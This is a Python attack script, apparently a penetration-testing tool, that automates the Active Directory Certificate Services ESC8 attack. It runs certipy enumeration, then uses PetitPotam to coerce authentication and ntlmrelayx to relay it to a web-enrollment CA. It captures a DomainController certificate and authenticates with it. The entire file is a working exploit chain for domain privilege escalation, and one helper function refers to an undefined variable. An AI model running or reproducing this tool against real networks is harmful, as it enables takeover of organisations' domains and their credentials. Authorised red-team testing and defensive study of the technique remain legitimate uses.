#!/usr/bin/env python
# coding: utf-8
#
# By Leon Johnson - twitter.com/sho_luv
#
# This program I wrote with the help of chatGPT
# it a wrapper for certipy and ntlmrelayx to automate esc8

import os
import subprocess
import sys
import re
import json
import argparse
import socket
import fcntl
import struct
import base64
import threading
from termcolor import colored

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15].encode('utf-8'))  # Encode string as bytes
    )[20:24])

def pretty_print(line, verbose=False):
    line = line.rstrip('\n')  # remove trailing newline characters
    colored_line = line
    if verbose:
        if line.startswith("[*]"):
            colored_line = line.replace("[*]", colored("[*]", "green"))
        elif line.startswith("[!]"):
            colored_line = line.replace("[!]", colored("[!]", "red"))
        print(colored_line)
    elif line.startswith("[*]"):
        colored_line = line.replace("[*]", colored("[*]", "green"))
        print(colored_line)

def certipy_auth(certname,  domain, verbose=False):
    pfx = certname + ".pfx"
    command = ["certipy", "auth", "-pfx", pfx, "-username", certname, "-domain", domain]
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
    for line in process.stdout:
        pretty_print(line, verbose)
    process.wait()

def certipy_find(username, password, domain, verbose=False):
    command = ["certipy", "find", "-u", username, "-p", password, "-target", domain, "-output", "adcs"]
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
    for line in process.stdout:
        pretty_print(line, verbose)
    process.wait()


def run_ntlmrelayx_and_petitpotam(username, password, domain, verbose=False):
    with open("adcs_Certipy.json", "r") as file:
        data = json.load(file)

    certificate_authorities = data.get("Certificate Authorities")
    ca_found = False
    if certificate_authorities:
        for ca in certificate_authorities.values():
            web_enrollment = ca.get("Web Enrollment")
            dns_name = ca.get("DNS Name")
            if web_enrollment == "Enabled" and dns_name:
                ca_found = True
                ntlmrelayx_command = (
                    f"ntlmrelayx.py --target http://{dns_name}/certsrv/certfnsh.asp "
                    "--adcs --template DomainController"
                )
                pretty_print("[*] " + ntlmrelayx_command, verbose)

                petitpotam_command = (
                    f"python PetitPotam.py -u {username} -p {password} "
                    f"{get_ip_address('eth0')} {domain}"
                )
                pretty_print("[*] " + petitpotam_command, verbose)

                # Run ntlmrelayx
                with subprocess.Popen(
                    ntlmrelayx_command, shell=True, stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT
                ) as ntlmrelayx_process:

                    # Run PetitPotam
                    with subprocess.Popen(
                        petitpotam_command, shell=True, stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT, universal_newlines=True
                    ) as petitpotam_process:

                        # Print ntlmrelayx output as it's generated if verbose flag is set
                        for line in iter(ntlmrelayx_process.stdout.readline, b''):
                            line = line.decode().strip()
                            pretty_print(line, verbose)

                            cert = re.search(r"Base64 certificate of user (\w+\$?):", line)
                            if cert is not None:
                                certname = cert.group(1)
                                base64_certificate = next(
                                    iter(ntlmrelayx_process.stdout.readline, b'')
                                )
                                if verbose:
                                    print("\033[93m" + base64_certificate.decode().strip() + "\033[0m")

                                # Extract base64 certificate from ntlmrelayx output
                                save_certificate(certname, base64_certificate)
                                certipy_auth(certname,  domain, verbose)

                                ntlmrelayx_process.terminate()
                                break  # Stop reading output once we have the certificate


                        if ntlmrelayx_process.poll() is None:
                            print("Process terminated due to timeout")

    if not ca_found:
        print("\033[91m[!] There are no Certificate Authorities with web enrollment enabled :( womp womp \033[0m", end='')  # Print in red

def extract_base64_certificate(output):
    match = next(iter(ntlmrelayx_process.stdout.readline, b''))
    if match:
        print("\033[93m" + match + "\033[0m")
        base64_certificate = match.group(1).strip()
        print("\033[93m" + base64_certificate + "\033[0m")
        return base64_certificate
    else:
        return None


def save_certificate(username, base64_certificate):
    pfx_filename = f"{username}.pfx"
    with open(pfx_filename, "wb") as file:
        file.write(base64.b64decode(base64_certificate))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("domain_user_pass", help="domain.com/user:pass")
    parser.add_argument("-v", "--verbose", action="store_true", help="increase output verbosity")
    args = parser.parse_args()

    domain_user_pass = args.domain_user_pass.split("/")
    if len(domain_user_pass) != 2:
        print("Invalid domain/user:pass format")
        sys.exit(1)

    domain = domain_user_pass[0]
    user_pass = domain_user_pass[1].split(":")
    if len(user_pass) != 2:
        print("Invalid domain/user:pass format")
        sys.exit(1)

    username = user_pass[0]
    password = user_pass[1]

    certipy_find(username, password, domain, args.verbose)
    run_ntlmrelayx_and_petitpotam(username, password, domain, args.verbose)


if __name__ == "__main__":
    main()
